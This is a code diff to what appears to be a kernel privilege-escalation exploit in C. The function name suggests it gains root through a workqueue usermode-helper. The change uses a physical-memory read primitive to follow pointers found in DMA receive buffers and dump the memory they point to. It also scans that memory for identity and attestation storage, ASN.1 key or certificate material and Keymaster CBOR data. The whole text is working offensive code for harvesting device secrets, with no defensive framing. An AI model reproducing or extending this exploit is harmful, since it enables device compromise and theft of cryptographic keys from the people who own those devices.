@@ -558,9 +558,10 @@ static int install_workqueue_umh_root(int fd) {
                   (unsigned long long)rxptr, (unsigned long long)rxsz);
 
           /* Read rx buffer if it exists and is in direct-map range */
+          uint8_t rxdata[4096];
+          memset(rxdata, 0, sizeof(rxdata));
           if (rxptr > 0xffffff8000000000ULL && rxptr < 0xffffff9000000000ULL) {
             fprintf(rxlog, "\n*** RX BUFFER DATA ***\n");
-            uint8_t rxdata[4096];
             /* Read up to 4KB of rx buffer */
             for (int blk = 0; blk < 32; blk++) {
               pipe_phys_read_data(fd, rxptr + blk * 128, rxdata + blk * 128, 128);
@@ -575,6 +576,65 @@ static int install_workqueue_umh_root(int fd) {
               }
             }
             fprintf(rxlog, "\n");
+          }
+
+          /* === CHASE POINTERS — read what the DMA buffers point to! === */
+          fprintf(rxlog, "\n*** CHASING DMA BUFFER POINTERS ***\n");
+          /* Read 256 bytes from each unique pointer found in the rx data */
+          uint8_t chase[256];
+          for (int off = 0; off < 4096 - 7; off += 8) {
+            uint64_t ptr = *(uint64_t*)(rxdata + off);
+            /* Only chase direct-map pointers (readable by pipe physrw) */
+            if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL &&
+                ptr != rxptr &&  /* skip self-references */
+                (ptr & 0xFFF) == 0) {  /* only page-aligned = likely buffer starts */
+              /* Avoid duplicates by checking if we already chased this */
+              static uintptr_t chased[64];
+              static int n_chased = 0;
+              int dup = 0;
+              for (int c = 0; c < n_chased; c++) {
+                if (chased[c] == ptr) { dup = 1; break; }
+              }
+              if (dup) continue;
+              if (n_chased < 64) chased[n_chased++] = ptr;
+
+              fprintf(rxlog, "\n--- PTR 0x%016llx (from rx+0x%x) ---\n",
+                      (unsigned long long)ptr, off);
+
+              /* Read 256 bytes */
+              memset(chase, 0, sizeof(chase));
+              int ok = 1;
+              for (int blk = 0; blk < 2 && ok; blk++) {
+                ok = pipe_phys_read_data(fd, ptr + blk * 128, chase + blk * 128, 128);
+              }
+              if (ok) {
+                for (int i = 0; i < 256; i++) {
+                  if (i % 32 == 0) fprintf(rxlog, "  %04x: ", i);
+                  fprintf(rxlog, "%02x ", chase[i]);
+                  if (i % 32 == 31) {
+                    fprintf(rxlog, " | ");
+                    for (int j = i - 31; j <= i; j++)
+                      fprintf(rxlog, "%c", (chase[j] >= 0x20 && chase[j] < 0x7f) ? chase[j] : '.');
+                    fprintf(rxlog, "\n");
+                  }
+                }
+                /* Check for known markers */
+                if (memcmp(chase, "TSID", 4) == 0)
+                  fprintf(rxlog, "  *** TSID — IDENTITY STORAGE! ***\n");
+                if (memcmp(chase, "STTA", 4) == 0)
+                  fprintf(rxlog, "  *** STTA — ATTESTATION STORAGE! ***\n");
+                if (memcmp(chase, "JACK", 4) == 0)
+                  fprintf(rxlog, "  *** OUR OVERFLOW MARKER FOUND! ***\n");
+                /* Check for ASN.1 DER headers (key material) */
+                if (chase[0] == 0x30 && (chase[1] == 0x82 || chase[1] == 0x81))
+                  fprintf(rxlog, "  *** ASN.1 SEQUENCE — POSSIBLE KEY/CERT! ***\n");
+                /* Check for CBOR headers */
+                if (chase[0] >= 0xA0 && chase[0] <= 0xBF)
+                  fprintf(rxlog, "  *** CBOR MAP — POSSIBLE KEYMASTER DATA! ***\n");
+              } else {
+                fprintf(rxlog, "  (unreadable)\n");
+              }
+            }
           }
 
           /* Also read 4KB AFTER the channel struct — heap data that was overflowed */
